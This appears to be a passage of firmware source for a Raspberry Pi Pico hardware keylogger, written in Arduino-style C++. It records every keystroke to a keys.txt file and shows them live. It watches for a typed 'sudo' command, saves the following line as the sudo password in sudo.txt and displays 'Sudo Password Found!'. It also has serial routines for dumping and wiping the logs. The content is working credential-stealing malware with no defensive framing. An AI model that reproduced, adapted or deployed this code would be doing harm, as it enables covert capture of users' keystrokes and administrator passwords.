
void restartPico() {
  showWaitScreen("Restarting Pico...");
  watchdog_enable(1, 1);
  while (true) {}
}

void setLayout() {
    File file = LittleFS.open("/config.txt", "r");
    if (!file) {
        Serial.println("No config.txt found. Using default layout (us).");
        Keyboard.setLayout(us_layout);
        return;
    }

    String savedLayout = "us";
    while (file.available()) {
        String line = file.readStringUntil('\n');
        line.trim();
        if (line.startsWith("Layout:")) {
            savedLayout = line.substring(7);
            savedLayout.trim();
        }
    }
    file.close();

    if      (savedLayout == "us")    Keyboard.setLayout(us_layout);
    else if (savedLayout == "uk")    Keyboard.setLayout(uk_layout);
    else if (savedLayout == "de")    Keyboard.setLayout(de_layout);
    else if (savedLayout == "fr")    Keyboard.setLayout(fr_layout);
    else if (savedLayout == "fi")    Keyboard.setLayout(fi_layout);
    else if (savedLayout == "be")    Keyboard.setLayout(be_layout);
    else if (savedLayout == "es")    Keyboard.setLayout(es_layout);
    else if (savedLayout == "dk")    Keyboard.setLayout(dk_layout);
    else if (savedLayout == "it")    Keyboard.setLayout(it_layout);
    else if (savedLayout == "tr")    Keyboard.setLayout(tr_layout);
    else if (savedLayout == "pt")    Keyboard.setLayout(pt_layout);
    else if (savedLayout == "br")    Keyboard.setLayout(br_layout);
    else if (savedLayout == "be")    Keyboard.setLayout(be_layout);
    else {
        Serial.println("Unknown layout in config.txt, defaulting to us.");
        Keyboard.setLayout(us_layout);
    }

    Serial.println("Keyboard layout set to: " + savedLayout);
}

// ============================================================ Buffer Functions =================================================================

void flushBuffer() {
    if (bufferIndex > 0) {
        File f = LittleFS.open("/keys.txt", "a");
        if (f) {
            f.write((const uint8_t*)keyBuffer, bufferIndex);
            f.flush();
            f.close();
            bufferIndex = 0;
        } else {
            Serial.println("Error writing to keys.txt");
        }
    }
}

void writeBufferedKey(char key) {
    if (liveCaptureActive) {
        if (lastPrintWasRoute) {
            printout("\n");
            lastPrintWasRoute = false;
            printout("[LOG] ");
        }
        if (liveCaptureStart) {
            liveCaptureStart = false;
            printout("[LOG] ");
        }

        char str[2] = { key, '\0' };
        printout(str);
    }
    if (!commandDetected && bufferIndex >= 5) { 
        String lastFive = String(keyBuffer[bufferIndex - 4]) + 
                          String(keyBuffer[bufferIndex - 3]) + 
                          String(keyBuffer[bufferIndex - 2]) + 
                          String(keyBuffer[bufferIndex - 1]) + 
                          String(key);        
        if (lastFive == "sudo ") {
            commandDetected = true;
            sudoPassword = "";
        }
    }
    if (commandDetected && key == '\n') {
        passwordExpected = true;
        commandDetected = false;
        sudoPassword = "";
        return;
    }
    if (passwordExpected && passwordWaiting) {
        if (key == '\n') {
            passwordExpected = false;
            if (sudoPassword.length() > 0) {
                File sudoFile = LittleFS.open("/sudo.txt", "w");
                if (sudoFile) {
                    sudoFile.println(sudoPassword);
                    sudoFile.close();
                    showWaitScreen("Sudo Password Found!\n\n" + sudoPassword);
                    passwordWaiting = false;
                } else {
                    Serial.println("Error saving password.");
                }
                sudoPassword = "";
            }
            return;
        } else if (key != '\r') {
            sudoPassword += key;
        }
    }
    if (bufferIndex < BUFFER_SIZE - 1) {
        keyBuffer[bufferIndex++] = key;
        lastKeyTime = millis();
    } else {
        flushBuffer();
    }
}

void openLogFile() {
    File f = LittleFS.open("/keys.txt", "a");
    if (!f) {
        Serial.println("Error opening log file");
    }
}

void closeLogFile() {
    flushBuffer();
    File f = LittleFS.open("/keys.txt", "a");
    if (f) {
        f.close();
    }
}

void checkInactivity() {
    if (bufferIndex > 0 && (millis() - lastKeyTime > INACTIVITY_TIMEOUT_MS)) {
        flushBuffer();
    }
}

// ============================================================== Serial Functions =================================================================

void readLog() {
    File i = LittleFS.open("keys.txt", "r");
    delay(200);
    Serial.println("-------- LOGS ----------");
    if (i) {
      while (i.available()) {
        Serial.write(i.read());
      }
      i.close();
    }
    Serial.println("\n------------------------");
    Serial.println("\n");
}

void clearLog() {
    File i = LittleFS.open("keys.txt", "w");
    delay(2000);
    if (i) {
      i.write("");
      Serial.println("Log File Deleted: DONE");
      i.close();
    }
}

void formatFS() {
    delay(2000);
    LittleFS.format();
    Serial.println("Formatted FS : DONE");
}
